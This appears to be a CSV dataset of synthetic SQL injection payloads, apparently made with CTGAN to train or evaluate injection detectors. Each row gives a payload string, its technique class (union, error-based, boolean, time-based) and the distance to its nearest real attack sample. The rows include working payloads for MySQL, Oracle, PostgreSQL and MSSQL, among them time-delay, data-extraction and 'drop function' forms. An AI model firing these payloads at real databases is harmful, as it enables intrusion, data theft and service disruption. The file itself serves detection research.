CTGAN_001181,attack,error,1  )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  6518  =  6518,nearest_attack_euclidean,R007927,4.836195250629881
CTGAN_001182,attack,error,"1'   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  'gfll'  =  'gfll",nearest_attack_euclidean,R007122,3.759128716141458
CTGAN_001183,attack,union,"1""  )   where 1700  =  1700 union all select null,null,null,null,null#",nearest_attack_euclidean,R006563,3.532395821645844
CTGAN_001184,attack,boolean,or '1'  =  '1,nearest_attack_euclidean,R000253,3.6104201713302477
CTGAN_001185,attack,union,"-2889   )    )    as iqzv where 1786  =  1786 union all select 1786,1786,1786,1786,1786,1786,1786,1786--",nearest_attack_euclidean,R004156,4.197684774925478
CTGAN_001186,attack,union,"-7422"" union all select 9127,9127,9127,9127,9127,9127,9127,9127,9127,9127#",nearest_attack_euclidean,R006582,2.9576912324043483
CTGAN_001187,attack,union,"-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--",nearest_attack_euclidean,R007483,2.533906320134656
CTGAN_001188,attack,error,"1 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  -- jpqa",nearest_attack_euclidean,R002636,4.595843949733542
CTGAN_001189,attack,error,"1'  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  'tetk'  =  'tetk",nearest_attack_euclidean,R006369,9.098148796477638
CTGAN_001190,attack,union,"1"" where 4808  =  4808 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000989,4.208671246705422
CTGAN_001191,attack,time,1'   )    )    as kdse where 6767  =  6767 rlike sleep  (  5  )  #,nearest_attack_euclidean,R001214,3.5971555841161638
CTGAN_001192,attack,time,"1"" or sleep  (  5  )  ",nearest_attack_euclidean,R004430,4.553458788867718
CTGAN_001193,attack,union," select * from users where id  =  1 union select !<1,version  (    )   -- 1",nearest_attack_euclidean,R000192,7.180560533486016
CTGAN_001194,attack,union,"-8034""  )   where 1292  =  1292 union all select 1292,1292,1292,1292,1292#",nearest_attack_euclidean,R005119,4.041093034101762
CTGAN_001195,attack,boolean,1'  )   and 2305  =  1934,nearest_attack_euclidean,R006483,1.7937215207050465
CTGAN_001196,attack,boolean,"1'||  (  select 'xpjg' where 3036  =  3036 and elt  (  1832  =  6644,6644   )    )   ||'",nearest_attack_euclidean,R002877,2.695160845215331
CTGAN_001197,attack,boolean,1   )    )    as goar where 2405  =  2405 and 5927  =  9731--,nearest_attack_euclidean,R002796,1.431874711725622
CTGAN_001198,attack,time,"1"" and sleep  (  5  )   and ""tdid"" like ""tdid",nearest_attack_euclidean,R001212,3.0669710036481983
CTGAN_001199,attack,other, (  case when 2646  =  8520 then 2646 else null end  ) ,nearest_attack_euclidean,R001379,2.772393953039837
CTGAN_001200,attack,union,"-1269"" union all select 8412,8412,8412,8412,8412,8412,8412,8412--",nearest_attack_euclidean,R007394,3.0675352662053004
CTGAN_001201,attack,union,"-7738%""  )   union all select 8754,8754,8754,8754,8754,8754,8754,8754,8754#",nearest_attack_euclidean,R001843,3.5718248196870426
CTGAN_001202,attack,error,"-1639   )    )    or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   3318  =  3318",nearest_attack_euclidean,R005676,5.872890298832014
CTGAN_001203,attack,time,select sleep  (  5  )   and '%'  =  ',nearest_attack_euclidean,R007704,6.377674226646275
CTGAN_001204,attack,error,"1'||  (  select 'oyyu' where 6765  =  6765 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   ||'",nearest_attack_euclidean,R000874,2.732966739113824
CTGAN_001205,attack,boolean,1   )    )     )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  6062  =  6062,nearest_attack_euclidean,R003160,3.7462183133876272
CTGAN_001206,attack,time,"1',  (  select   (  case when   (  1609  =  1609  )   then waitfor delay '0:0:5' else 1609*  (  select 1609 from master..sysdatabases  )   end   )    )   ",nearest_attack_euclidean,R003636,5.833588359127143
CTGAN_001207,attack,boolean,"1   )    )     )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  8738  =  8738",nearest_attack_euclidean,R002000,2.8064904187684165
CTGAN_001208,attack,union,"-6155%'   )    )    union all select 2421,2421,2421,2421,2421#",nearest_attack_euclidean,R006095,3.20337958595817
CTGAN_001209,attack,error,"1'  )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R008331,3.6603493344383127
CTGAN_001210,attack,time,"1""   )    )    waitfor delay '0:0:5' and    (    (   ""koni"" like ""koni",nearest_attack_euclidean,R008318,3.5926570655053855
CTGAN_001211,attack,other,1' where 7036  =  7036,nearest_attack_euclidean,R001285,0.961539355367472
CTGAN_001212,attack,boolean,"1   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R004549,3.0608975398542815
CTGAN_001213,attack,time,1'  )   and sleep  (  5  )   and   (  'xecl' like 'xecl,nearest_attack_euclidean,R003879,3.7174146317254784
CTGAN_001214,attack,time,1' where 1153  =  1153 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  --,nearest_attack_euclidean,R003152,17.488955610381996
CTGAN_001215,attack,boolean,"1'||  (  select 'xuof' from dual where 8794  =  8794 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R003511,3.998762696986025
CTGAN_001216,attack,error,"1   )    )    and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (   5349  =  5349",nearest_attack_euclidean,R001564,4.2740615569969655
CTGAN_001217,attack,time,1'   )    )     )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (     (  'eihl'  =  'eihl,nearest_attack_euclidean,R005777,3.3796448036628033
CTGAN_001218,attack,boolean,select * from users where id  =  '1'   or 1  =  1 -- 1',nearest_attack_euclidean,R000350,2.5127941297260334
CTGAN_001219,attack,error,"1'   )    )     )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (     (  'zpkv'  =  'zpkv",nearest_attack_euclidean,R004765,2.833878479707383
CTGAN_001220,attack,time,"1"" and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and ""tqbi""  =  ""tqbi",nearest_attack_euclidean,R006092,4.455952800732923
CTGAN_001221,attack,boolean,"-1631%""  )   or elt  (  8285  =  1709,1709  )   and   (  ""%""  =  """,nearest_attack_euclidean,R002228,2.5133250479772133
CTGAN_001222,attack,boolean,"1%""  )   and 9764  =  6037 and   (  ""%""  =  """,nearest_attack_euclidean,R007481,2.012120279867837
CTGAN_001223,attack,other,"iif  (  4460  =  1610,1,1/0  )  ",nearest_attack_euclidean,R006045,2.459916899879497
CTGAN_001224,attack,error,"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'dqjq'  =  'dqjq",nearest_attack_euclidean,R002238,2.437584213244289
CTGAN_001225,attack,other,1  ) ,nearest_attack_euclidean,R002968,2.409789450407821
CTGAN_001226,attack,union,"1%""  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R007275,3.939599257871671
CTGAN_001227,attack,union,"-8999"" where 2821  =  2821 union all select 2821,2821,2821,2821,2821,2821,2821,2821#",nearest_attack_euclidean,R008006,3.0466140961816226
CTGAN_001228,attack,error,"1 where 5266  =  5266 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",nearest_attack_euclidean,R008459,4.894771128352641
CTGAN_001229,attack,boolean,"1   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R004549,3.2944394646153263
CTGAN_001230,attack,time,"1'   )    )     )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (     (  'subq' like 'subq",nearest_attack_euclidean,R006609,4.608468215296215
CTGAN_001231,attack,error,"1'   )    )    or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (   'skdm'  =  'skdm",nearest_attack_euclidean,R003066,2.4861006930463
CTGAN_001232,attack,boolean,"1 and make_set  (  8403  =  8403,8899  )  -- rbxf",nearest_attack_euclidean,R005396,1.6090968434591746
CTGAN_001233,attack,time,1' in boolean mode  )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R003584,4.280735738452887
CTGAN_001234,attack,time,1'||  (  select 'nvvm' from dual where 5567  =  5567 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo   )    )   ||',nearest_attack_euclidean,R005935,38.06042931060896
CTGAN_001235,attack,error,"1 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  # vojr",nearest_attack_euclidean,R006705,4.626288098242822
CTGAN_001236,attack,time,1'   )    )    as hxxm where 3792  =  3792 and sleep  (  5  )  #,nearest_attack_euclidean,R003373,3.6267630782293017
CTGAN_001237,attack,other,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null   )    )   ||'",nearest_attack_euclidean,R003135,5.1541879921713525
CTGAN_001238,attack,time,"1""  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and   (  ""cjkk"" like ""cjkk",nearest_attack_euclidean,R002208,5.273186078597711
CTGAN_001239,attack,boolean,"-6561""   )    )     )   or 6872  =  6872 and    (    (     (  ""azqp"" like ""azqp",nearest_attack_euclidean,R001143,1.6950992494242405
CTGAN_001240,attack,time,1  )   where 9078  =  9078 rlike sleep  (  5  )  #,nearest_attack_euclidean,R006011,2.357626672975646
CTGAN_001241,attack,time,1' and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and 'mepp'  =  'mepp,nearest_attack_euclidean,R005838,4.2167047211023565
CTGAN_001242,attack,error,"1'+  (  select vohg where 6383  =  6383 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )      )    )   +'",nearest_attack_euclidean,R007553,25.331153459904886
CTGAN_001243,attack,time,"1%'   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   '%'  =  '",nearest_attack_euclidean,R005100,3.6713336315542318
CTGAN_001244,attack,time,"1' in boolean mode  )   and elt  (  1210  =  1210,sleep  (  5   )    )   #",nearest_attack_euclidean,R002880,3.8919443629699195
CTGAN_001245,attack,union,"1   )    )    as jzzo where 7773  =  7773 union all select null,null,null,null,null#",nearest_attack_euclidean,R008319,4.74593871859732
CTGAN_001246,attack,time,1'   )    )    as hxxm where 3792  =  3792 and sleep  (  5  )  #,nearest_attack_euclidean,R003373,3.1462252452533486
CTGAN_001247,attack,other,if  (  8995  =  9787  )   select 8995 else drop function ofgg--,nearest_attack_euclidean,R004222,2.833923020351028
CTGAN_001248,attack,union,"1'+  (  select ugvj where 2593  =  2593 union all select null,null,null,null,null#",nearest_attack_euclidean,R004993,3.9959241858902397
CTGAN_001249,attack,other,1  )   as ilqx where 8547  =  8547,nearest_attack_euclidean,R003156,1.5437514081960013
CTGAN_001250,attack,time,"1  )   or elt  (  6272  =  6272,sleep  (  5   )    )    and   (  8600  =  8600",nearest_attack_euclidean,R008046,3.1986599237769613
CTGAN_001251,attack,boolean,"-7306"" or 2081  =  6847",nearest_attack_euclidean,R006380,1.5440125636968713
CTGAN_001252,attack,boolean,"1 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   -- zvkh",nearest_attack_euclidean,R008059,3.3427579070236786
CTGAN_001253,attack,other,1  )   as hggi where 6511  =  6511,nearest_attack_euclidean,R002700,2.216282263253475
CTGAN_001254,attack,error,"1%"" and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""%""  =  """,nearest_attack_euclidean,R008453,4.00322557864276
CTGAN_001255,attack,boolean,or '7659'  =  '7659,nearest_attack_euclidean,R000187,3.5869739870884776
CTGAN_001256,attack,time,1' in boolean mode  )   waitfor delay '0:0:5'#,nearest_attack_euclidean,R001569,3.6835690040325493
CTGAN_001257,attack,union," select * from users where id  =  1 or $ .  =  1 union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000182,4.539048334845066
CTGAN_001258,attack,other,""" or """" """,nearest_attack_euclidean,R000286,5.74928907559338
CTGAN_001259,attack,boolean,"1%""   )    )     )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R006189,3.663260310098746
CTGAN_001260,attack,union,"1'  )   union all select null,null,null,null,null--",nearest_attack_euclidean,R005850,4.164217354638246
CTGAN_001261,attack,error,"1'+  (  select vohg where 6383  =  6383 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )      )    )   +'",nearest_attack_euclidean,R007553,25.40774629992309
CTGAN_001262,attack,boolean,"1' or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and 'jiyx'  =  'jiyx",nearest_attack_euclidean,R002421,4.4048174122932044
CTGAN_001263,attack,other,select case when 6558  =  4327 then 1 else null end--,nearest_attack_euclidean,R000710,5.061118882204179
CTGAN_001264,attack,union,"1%""   )    )    union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R008729,4.567433881798616
CTGAN_001265,attack,union,"-8881%' union all select 8420,8420,8420,8420,8420,8420,8420#",nearest_attack_euclidean,R002595,2.784072966741069
CTGAN_001266,attack,boolean,"1  )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and   (  5621  =  5621",nearest_attack_euclidean,R004187,3.8808636609808485
CTGAN_001267,attack,other,"elt  (  2427  =  2427,5518  )  ",nearest_attack_euclidean,R006197,2.9069185863307685
CTGAN_001268,attack,other,1  )   as sglv where 7676  =  7676,nearest_attack_euclidean,R004431,0.7944906401661402
CTGAN_001269,attack,boolean,"1' and make_set  (  8403  =  8403,8899  )   and 'fttd' like 'fttd",nearest_attack_euclidean,R003864,1.7140124770378597
CTGAN_001270,attack,other,"1""  )   as vqkz where 8536  =  8536",nearest_attack_euclidean,R004832,2.667320466632748
CTGAN_001271,attack,union,"-1269"" union all select 8412,8412,8412,8412,8412,8412,8412,8412--",nearest_attack_euclidean,R007394,2.982060963494665
CTGAN_001272,attack,other, (  8362  =  9139  )  *9139,nearest_attack_euclidean,R005586,2.6865772119744924
CTGAN_001273,attack,error,"1'||  (  select 'fbtm' where 1335  =  1335 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  ||'",nearest_attack_euclidean,R007238,4.481764322834819
CTGAN_001274,attack,error,"1   )    )    procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (   3102  =  3102",nearest_attack_euclidean,R007664,3.4328249830087336
CTGAN_001275,attack,boolean,"1   )    )    and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   9542  =  9542",nearest_attack_euclidean,R006058,3.238963592509478
CTGAN_001276,attack,time,1 and 6969  =    (  select 6969 from pg_sleep  (  5   )    ) ,nearest_attack_euclidean,R005207,4.683990476830062
CTGAN_001277,attack,error,-1344  )   as gqgi where 2545  =  2545 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --,nearest_attack_euclidean,R006067,3.6413468739593284
CTGAN_001278,attack,error,"1' in boolean mode  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  #",nearest_attack_euclidean,R005531,3.2370606230245995
CTGAN_001279,attack,other,"1',  (  select   (  case when   (  5249  =  9648  )   then 1 else 1/  (  select 0  )   end   )    )   ",nearest_attack_euclidean,R005472,6.047816922827826
CTGAN_001280,attack,other,1   )    )    as mlpf where 7425  =  7425,nearest_attack_euclidean,R001024,2.904325723580548
CTGAN_001281,attack,union,"-3562""  )   as eghl where 7094  =  7094 union all select 7094,7094,7094,7094#",nearest_attack_euclidean,R002441,5.375768701294152
CTGAN_001282,attack,other,"select dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  70  )  ||chr  (  106  )  ||chr  (  78  )  ,5  )   from dual--",nearest_attack_euclidean,R001818,5.14856717057311
CTGAN_001283,attack,boolean,"-9864""  )   or elt  (  5885  =  4936,4936  )   and   (  ""bfbb"" like ""bfbb",nearest_attack_euclidean,R007605,4.063121999612598
CTGAN_001284,attack,union,"-3819'   )    )     )   union all select 9014,9014,9014,9014,9014,9014--",nearest_attack_euclidean,R002333,4.57165798240537
CTGAN_001285,attack,union,"1""  )   where 3084  =  3084 union all select null,null--",nearest_attack_euclidean,R006692,3.6318078272447605
CTGAN_001286,attack,time,"1%""   )    )    rlike sleep  (  5  )  #",nearest_attack_euclidean,R001591,2.8963158628112198
CTGAN_001287,attack,error,1'||  (  select 'hlxd' from dual where 2615  =  2615 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ||',nearest_attack_euclidean,R004288,4.456081493260903
CTGAN_001288,attack,time,"1',  (  select   (  case when   (  9443  =  9443  )   then sleep  (  5  )   else 9443*  (  select 9443 from information_schema.character_sets  )   end   )    )   ",nearest_attack_euclidean,R000672,9.581261233260175
CTGAN_001289,attack,other,if  (  8858  =  5680  )   select 8858 else drop function pyuo--,nearest_attack_euclidean,R000726,2.0988319359289833
CTGAN_001290,attack,boolean,"1 and elt  (  8853  =  1675,1675  )  -- jegm",nearest_attack_euclidean,R004931,3.129930262030679
CTGAN_001291,attack,other,if  (  8995  =  9787  )   select 8995 else drop function ofgg--,nearest_attack_euclidean,R004222,3.8864578465233386
CTGAN_001292,attack,boolean,"1'   )    )    or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   'cdaq' like 'cdaq",nearest_attack_euclidean,R002573,3.5574762307662384
CTGAN_001293,attack,boolean,"1""  )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and   (  ""ypoj""  =  ""ypoj",nearest_attack_euclidean,R004052,4.478109244078068
CTGAN_001294,attack,union,"1""   )    )    as isqj where 6344  =  6344 union all select null,null,null,null--",nearest_attack_euclidean,R001505,4.35388166523154
CTGAN_001295,attack,boolean,"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'yhkr'  =  'yhkr",nearest_attack_euclidean,R004747,3.3078856374506755
CTGAN_001296,attack,error,"1""  )   as jaxh where 6318  =  6318 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   --",nearest_attack_euclidean,R002893,5.050263920885085
CTGAN_001297,attack,error,"1 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   -- uslt",nearest_attack_euclidean,R003948,3.7909903767207336
CTGAN_001298,attack,union,"-4756""   )    )    union all select 6846,6846,6846,6846,6846,6846,6846#",nearest_attack_euclidean,R007646,2.516996974310602
CTGAN_001299,attack,other,"1""  )   as lvbm where 8179  =  8179",nearest_attack_euclidean,R002903,4.521127693931691
CTGAN_001300,attack,error,"1'+  (  select vohg where 6383  =  6383 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )      )    )   +'",nearest_attack_euclidean,R007553,25.493215300983458
CTGAN_001301,attack,other,1  )   as nmlm where 9872  =  9872,nearest_attack_euclidean,R005215,0.870874858469042
CTGAN_001302,attack,error,1' in boolean mode  )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   #,nearest_attack_euclidean,R003835,4.97805939958366
CTGAN_001303,attack,error,"1'   )    )     )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (     (  'aqdj'  =  'aqdj",nearest_attack_euclidean,R005992,4.266575553273794
CTGAN_001304,attack,other,1'  )   as fkpn where 1100  =  1100,nearest_attack_euclidean,R007606,1.5377925311118281
CTGAN_001305,attack,boolean,"1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  'qfwc'  =  'qfwc",nearest_attack_euclidean,R008848,3.4093604495188883
CTGAN_001306,attack,union,"-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--",nearest_attack_euclidean,R003399,2.9778335953580206
CTGAN_001307,attack,boolean,"1""   )    )    as pafp where 6770  =  6770 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R007842,4.423495773761363
CTGAN_001308,attack,error,"1'   )    )     )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (     (  'eugs'  =  'eugs",nearest_attack_euclidean,R001102,4.803593796187855
CTGAN_001309,attack,time,1'   )    )    as xqvq where 4816  =  4816 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R001578,3.5690836062748956
CTGAN_001310,attack,union,"-2305' in boolean mode  )   union all select 8147,8147,8147,8147,8147,8147,8147,8147,8147,8147--",nearest_attack_euclidean,R005725,2.8065013958473717
CTGAN_001311,attack,boolean,"1'+  (  select wjpc where 5943  =  5943 and make_set  (  8403  =  8403,8899   )    )   +'",nearest_attack_euclidean,R009010,2.9941392848835515
CTGAN_001312,attack,error,"1%'  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  '%'  =  '",nearest_attack_euclidean,R002545,2.135495819861687
CTGAN_001313,attack,other,if  (  5896  =  4251  )   select 5896 else drop function xmyk--,nearest_attack_euclidean,R001289,2.268091827969108
CTGAN_001314,attack,error,"1%'  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  '%'  =  '",nearest_attack_euclidean,R001548,4.752246133753499
CTGAN_001315,attack,other, (  case when 8422  =  8452 then 1 else null end  ) ,nearest_attack_euclidean,R006965,1.5697943432503385
CTGAN_001316,attack,other,1'||  (  select 'etvo' from dual where 1557  =  1557,nearest_attack_euclidean,R001658,4.979709154927972
CTGAN_001317,attack,other,if  (  8858  =  5680  )   select 8858 else drop function pyuo--,nearest_attack_euclidean,R000726,2.9754726245352603
CTGAN_001318,attack,error,"1' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and 'ctac' like 'ctac",nearest_attack_euclidean,R005767,3.0503216845925425
CTGAN_001319,attack,other,"select * from generate_series  (  9709,9709,case when   (  9709  =  7795  )   then 1 else 0 end  )   limit 1--",nearest_attack_euclidean,R002011,5.417339827053991
CTGAN_001320,attack,union,"-6116""   )    )    union all select 3679,3679,3679,3679,3679,3679,3679--",nearest_attack_euclidean,R006085,3.1792725768065435
CTGAN_001321,attack,boolean,1'  )   where 8707  =  8707 and 3210  =  1477--,nearest_attack_euclidean,R006065,0.9271814429072303
CTGAN_001322,attack,error,"1'   )    )    as lxjs where 6503  =  6503 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  --",nearest_attack_euclidean,R006605,5.194733196072135
CTGAN_001323,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (     (  '%'  =  '",nearest_attack_euclidean,R004009,4.05326773566226
CTGAN_001324,attack,error,"1'  )   as mvai where 5856  =  5856 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",nearest_attack_euclidean,R001009,4.43054809592663
CTGAN_001325,attack,union," select * from users where id  =  1 union select @<@,version  (    )   -- 1",nearest_attack_euclidean,R000294,6.6367878443016055
CTGAN_001326,attack,boolean,"-9133""   )    )    or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   ""crfy""  =  ""crfy",nearest_attack_euclidean,R008996,4.309872852622216
